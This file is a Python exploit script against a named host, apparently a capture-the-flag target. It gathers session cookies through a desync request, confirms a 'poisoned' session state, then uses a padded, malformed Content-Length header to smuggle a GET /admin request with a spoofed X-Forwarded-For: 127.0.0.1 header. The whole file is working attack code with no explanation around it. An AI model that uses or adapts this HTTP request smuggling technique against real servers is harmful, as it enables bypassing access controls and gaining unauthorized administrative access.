#!/usr/bin/env python3
import socket
import time
import re
import json

TARGET_HOST = "doubletrouble.koreacentral.cloudapp.azure.com"
TARGET_PORT = 1337

def parse_cookies(response_text):
    cookies = {}
    for line in response_text.split('\r\n'):
        if line.lower().startswith('set-cookie:'):
            cookie_part = line.split(':', 1)[1].strip()
            if '=' in cookie_part:
                name, value = cookie_part.split('=', 1)
                value = value.split(';')[0]
                cookies[name] = value
    return cookies

sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=30.0)
sock.settimeout(30.0)

dummy_body = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\n\r\n".encode()
request1 = (
    f"GET /con HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    f"Content-Length: {len(dummy_body)}\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode() + dummy_body
sock.sendall(request1)

time.sleep(0.5)

response1 = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response1 += chunk
        if b"Reserved" in response1:
            break
    except socket.timeout:
        break

decoded1 = response1.decode("utf-8", errors="ignore")
cookies = parse_cookies(decoded1)
session_token = cookies.get("session_token")
user_id = cookies.get("user_id")

if not session_token or not user_id:
    sock.close()
    exit(1)

time.sleep(0.3)

check_request = (
    f"GET /api/v1/session/check HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    f"Cookie: session_token={session_token}; user_id={user_id}\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode()
sock.sendall(check_request)

check_response = b""
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk:
            break
        check_response += chunk
        if b"session_state" in check_response:
            break
    except socket.timeout:
        break

check_decoded = check_response.decode("utf-8", errors="ignore")
try:
    json_start = check_decoded.index("{")
    json_end = check_decoded.rindex("}") + 1
    session_info = json.loads(check_decoded[json_start:json_end])
    if session_info.get("session_state") != "poisoned":
        sock.close()
        exit(0)
except Exception:
    sock.close()
    exit(0)

calculated_offset = 114
smuggled = (
    f"GET /admin HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    f"X-Forwarded-For: 127.0.0.1\r\n"
    f"X-Offset: {calculated_offset}\r\n"
    f"Cookie: session_token={session_token}; user_id={user_id}\r\n\r\n"
).encode()

padding = "a" * 255
exploit_request = (
    f"POST /api/v1/data HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}\r\n"
    f"Cookie: session_token={session_token}; user_id={user_id}\r\n"
    f"Content-Length{padding}: \r\n"
    f"Content-Length: {len(smuggled)}\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode() + smuggled

sock.sendall(exploit_request)
time.sleep(2)

all_data = b""
for _ in range(15):
    try:
        sock.settimeout(1.0)
        chunk = sock.recv(8192)
        if not chunk:
            break
        all_data += chunk
    except socket.timeout:
        break

sock.close()
print(all_data.decode("utf-8", errors="ignore"))
